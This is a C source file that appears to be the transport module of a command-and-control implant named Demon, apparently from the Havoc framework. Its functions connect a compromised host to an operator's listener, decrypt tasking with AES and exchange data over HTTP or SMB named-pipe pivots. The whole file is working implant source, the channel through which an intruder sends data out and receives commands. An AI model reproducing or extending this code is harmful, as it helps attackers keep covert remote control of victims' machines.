#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Package.h>
#include <Core/Transport.h>
#include <Core/MiniStd.h>
#include <Core/TransportHttp.h>
#include <Core/TransportSmb.h>

#include <Crypt/AesCrypt.h>

BOOL TransportInit( )
{
    PUTS_DONT_SEND( "Connecting to listener" )
    PVOID  Data    = NULL;
    SIZE_T Size    = 0;
    BOOL   Success = FALSE;

    /* Sends to our connection (direct/pivot) */
#ifdef TRANSPORT_HTTP
    if ( PackageTransmitNow( Instance.MetaData, &Data, &Size ) )
    {
        AESCTX AesCtx = { 0 };

        /* Decrypt what we got */
        AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
        AesXCryptBuffer( &AesCtx, Data, Size );

        if ( Data )
        {
            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
            {
                Instance.Session.Connected = TRUE;
                Success = TRUE;
            }
        }
    }
#endif

#ifdef TRANSPORT_SMB
    if ( PackageTransmitNow( Instance.MetaData, NULL, NULL ) == TRUE )
    {
        Instance.Session.Connected = TRUE;
        Success = TRUE;
    }
#endif

    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Send = { 0 };
    BUFFER Resp = { 0 };

    Send.Buffer = Data;
    Send.Length = Size;

#ifdef TRANSPORT_HTTP

    if ( HttpSend( &Send, &Resp ) )
    {
        if ( RecvData )
            *RecvData = Resp.Buffer;

        if ( RecvSize )
            *RecvSize = Resp.Length;

        return TRUE;
    }

#endif

#ifdef TRANSPORT_SMB

    if ( SmbSend( &Send ) )
    {
        return TRUE;
    }

#endif

    return FALSE;
}

#ifdef TRANSPORT_SMB

BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Resp = { 0 };

    if ( RecvData )
        *RecvData = NULL;

    if ( RecvSize )
        *RecvSize = 0;

    if ( SmbRecv( &Resp ) )
    {
        if ( RecvData )
            *RecvData = Resp.Buffer;

        if ( RecvSize )
            *RecvSize = Resp.Length;

        return TRUE;
    }

    return FALSE;
}

#endif
